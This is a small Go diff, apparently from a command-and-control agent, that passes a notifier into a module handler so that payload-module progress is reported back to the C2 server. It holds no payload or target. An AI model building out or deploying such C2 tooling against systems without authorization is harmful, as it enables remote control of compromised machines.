@@ -100,7 +100,8 @@ func runCustomModule(cmd *cobra.Command, args []string) {
 		c2transport.NotifyC2(cmd, "Error decoding invocation: %v\n", err)
 		return
 	}
-	out := modules.ModuleHandler(peerIP, fileToDownload, payloadType, modName, checksum, invocation)
+	out := modules.ModuleHandler(peerIP, fileToDownload, payloadType, modName, checksum, invocation,
+		modules.WithNotifier(func(msg string) { c2transport.NotifyC2(cmd, "%s", msg) }))
 	c2transport.NotifyC2(cmd, "%s\n", out)
 }
 
